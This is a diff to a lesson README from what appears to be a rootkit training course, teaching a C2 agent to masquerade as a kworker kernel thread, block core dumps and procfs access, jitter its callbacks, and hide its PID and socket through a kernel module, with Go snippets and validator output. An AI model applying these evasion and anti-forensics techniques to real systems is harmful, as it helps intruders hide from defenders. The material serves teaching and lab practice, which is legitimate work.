@@ -1,26 +1,48 @@
 # L23: Process Masquerade
 
-L22 made the server invisible to browsers.
-But the agent process still shows its real name in `ps` output.
-A defender running `ps aux` sees an unfamiliar binary name.
-The callback port appears in `ss`.
-The binary sits in its path on disk.
+L22 routes browsers to the decoy page, but the agent still exposes its process
+name and regular callback interval.
+This exercise changes the process name, disables core dumps, and adds callback
+jitter.
+These controls reduce obvious indicators; they do not make a userspace process
+indistinguishable from a kernel thread.
 
-Real implants disguise themselves as kernel threads.
-BPFDoor renames itself to look like a kworker.
-Sliver adds random jitter between callbacks so the timing pattern is not uniform.
+## What you will observe
 
-## prctl PR_SET_NAME
+The agent keeps running, but its ordinary process name changes and peer
+processes can no longer read its mappings:
+
+```console
+student@victim:~$ cat /proc/1234/comm
+[kworker/0:1]
+student@victim:~$ cat /proc/1234/maps
+cat: /proc/1234/maps: Permission denied
+```
+
+The bracketed name is camouflage, not a conversion into a kernel thread.
+
+## Workspace
+
+```text
+exercises/L23-process-masquerade
+├── go.mod
+├── go.sum
+└── main.go
+```
+
+Complete the process controls, callback timing, and post-connect hiding in
+`main.go`.
+
+## Change the visible thread name
 
 Linux stores each thread's name in a 16-byte buffer (TASK_COMM_LEN).
 `prctl(PR_SET_NAME, name)` overwrites it.
 This is what `ps`, `top`, and `/proc/pid/comm` read.
 
 Kernel worker threads show as `[kworker/0:1]` in `ps`.
-The brackets are part of the name (the kernel adds them for threads
-that have no userspace memory mapping).
-`[kworker/0:1]` is 13 characters, which fits in TASK_COMM_LEN (16 bytes
-including the null terminator).
+The brackets are part of the name (the kernel adds them for threads that have no
+userspace memory mapping). `[kworker/0:1]` is 13 characters, which fits in
+TASK_COMM_LEN (16 bytes including the null terminator).
 
 ```go
 import "golang.org/x/sys/unix"
@@ -37,7 +59,7 @@ syscall.RawSyscall6(syscall.SYS_PRCTL, unix.PR_SET_NAME,
     uintptr(unsafe.Pointer(&name[0])), 0, 0, 0, 0)
 ```
 
-## Anti-forensics: dumpable and core limits
+## Prevent useful core dumps
 
 Two settings prevent core dumps from leaking memory contents:
 
@@ -49,14 +71,14 @@ unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
 unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
 ```
 
-`PR_SET_DUMPABLE` set to 0 also restricts `/proc/pid/mem` and
-`/proc/pid/maps` access, even for root.
+`PR_SET_DUMPABLE` set to 0 restricts ptrace-style access and sensitive procfs
+files for unprivileged peers.
 Combined with the core limit, a crash produces no dump file.
 
-## Callback jitter
+## Vary the callback interval
 
-A fixed callback interval (e.g., every 60 seconds) creates a detectable
-pattern in network logs.
+A fixed callback interval (e.g., every 60 seconds) creates a detectable pattern
+in network logs.
 Adding random jitter makes the timing irregular:
 
 ```go
@@ -70,13 +92,13 @@ func jitter(base, spread time.Duration) time.Duration {
 }
 ```
 
-Use `crypto/rand`, not `math/rand`.
-`math/rand` is deterministic and seeded predictably.
+Use `crypto/rand`, not `math/rand`. `math/rand` is deterministic and seeded
+predictably.
 
-## Auto-hide on connect
+## Hide only after the connection exists
 
-When the agent connects to the server, it should immediately hide itself
-using mkdir commands to the kernel module:
+When the agent connects to the server, it should immediately hide itself using
+mkdir commands to the kernel module:
 
 ```text
   agent starts
@@ -91,24 +113,23 @@ using mkdir commands to the kernel module:
        |
        v
   mkdir rklings.h.i.<own-pid>     # hide from ps
-  mkdir rklings.h.p.<port>        # hide callback port
-  mkdir rklings.h.f.<binary>      # hide binary from ls
+  mkdir rklings.h.p.<local-port>  # hide the connected socket
        |
        v
   begin command loop with jitter
 ```
 
-## You write
+## Implement it
 
-`main.go` (~60 lines):
+Complete `main.go`:
 
 - `prctl(PR_SET_NAME, "[kworker/0:1]")` to rename process
 - `prctl(PR_SET_DUMPABLE, 0)` to prevent memory access
 - `setrlimit(RLIMIT_CORE, 0)` to prevent core dumps
 - Jitter function using `crypto/rand`
-- Auto-hide: mkdir for own PID, callback port, and binary path on connect
+- Auto-hide its PID and the connected socket's local port after connecting
 
-## API
+## Use the process APIs
 
 ```go
 import (
@@ -139,23 +160,29 @@ crypto_rand.Read(buf[:])
 
 ## Test it
 
+```sh
+./rklings run L23
 ```
-$ rklings run l23
-student@vm:~$ ./agent &
-student@vm:~$ ps aux | grep kworker
+
+`run` starts the agent in the background.
+Inspect it inside the guest:
+
+```text
+student@victim:~$ ps aux | grep kworker
 root         7  0.0  0.0      0     0 ?  I    00:00 [kworker/0:0]
 student   1234  0.0  0.1  12345  6789 ?  S    00:01 [kworker/0:1]
 ```
 
-The agent appears as `[kworker/0:1]`.
-It blends in with real kernel worker threads.
-The only tell is the non-zero memory size, which `ps aux` shows but most
-quick checks skip.
+The agent's `comm` value is `[kworker/0:1]`.
+Its userspace mappings, memory usage, executable descriptor, credentials, and
+network activity remain useful distinguishing signals.
+The validator supplies the real callback needed to measure connection jitter and
+verify automatic concealment.
 
 ```
-student@vm:~$ cat /proc/1234/comm
+student@victim:~$ cat /proc/1234/comm
 [kworker/0:1]
-student@vm:~$ cat /proc/1234/maps
+student@victim:~$ cat /proc/1234/maps
 cat: /proc/1234/maps: Permission denied
 ```
 
@@ -163,20 +190,19 @@ cat: /proc/1234/maps: Permission denied
 
 ## Validate
 
-```
-$ rklings validate l23
+```sh
+./rklings validate L23
   [+] agent process comm is [kworker/0:1]
   [+] /proc/pid/comm matches [kworker/0:1]
   [+] process not dumpable (PR_SET_DUMPABLE 0)
   [+] core dump limit is zero
   [+] agent PID hidden from ps
-  [+] callback port hidden from ss
   [+] callback intervals vary (jitter working)
   PASS
 ```
 
 ## Next
 
-The agent is invisible to casual inspection.
-L24 scrubs the remaining forensic evidence: timestamps, shell history,
-login records, and journal entries.
+The process is less obvious, but the deployment still leaves timestamps, shell
+commands, login records, and journal entries.
+L24 identifies and clears those local records.
